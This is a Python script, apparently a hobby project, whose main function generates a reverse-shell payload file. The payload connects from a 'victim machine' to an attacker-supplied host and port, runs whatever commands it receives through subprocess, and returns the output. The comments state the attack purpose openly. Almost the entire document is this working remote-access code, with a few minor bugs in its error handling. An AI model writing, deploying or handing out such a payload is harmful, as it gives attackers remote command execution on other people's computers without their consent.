# Method to call from other python files
# TODO Fix bug so that User can also use cd command to change locations in terminal
def main(target_host, target_port, path):
    with open(path, 'w') as file:
        file.write("""
# Importing the Socket Module to create a TCP Client
# A Socket is a combination of an IP and a Port
# This program needs to be run on the victim machine, so that it can connect to the attacker
import socket
# Importing the termcolor module to print colored text
# from termcolor import colored
# Took out color module because it would create error on victim machine, if module is not installed
# Import subprocess Module to execute commands on a Windows/Linux/OS X
import subprocess

target_host = '""" + target_host + """'
target_port = """ + target_port + """

# Building a TCP Object
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to client with {Target_host, Target_port}
client.connect((target_host, target_port))
print('----------------Successfully connected!---------------')
print('-----------------------RESPONSE-----------------------')

while True:
    try:
        response = client.recv(4096)
        command = response.decode('UTF-8')
        command_parts = []
        if " " in command:
            command_parts = command.split(" ")
        else:
            command_parts = command
            
        try:
            process = subprocess.Popen(command_parts, stdout=subprocess.PIPE)
            stdout, stderr = process.communicate()
            stdout = stdout.decode()
            client.sendall(stdout.encode('UTF-8'))
        except subprocess.CalledProcessError as error:
            client.sendall('Error: '+str(error).encode('UTF-8'))

    except KeyboardInterrupt:
        client.sendall('RS stopped. Client has closed program.')
    except FileNotFoundError:
        client.sendall('Unknown Command...')
                """)
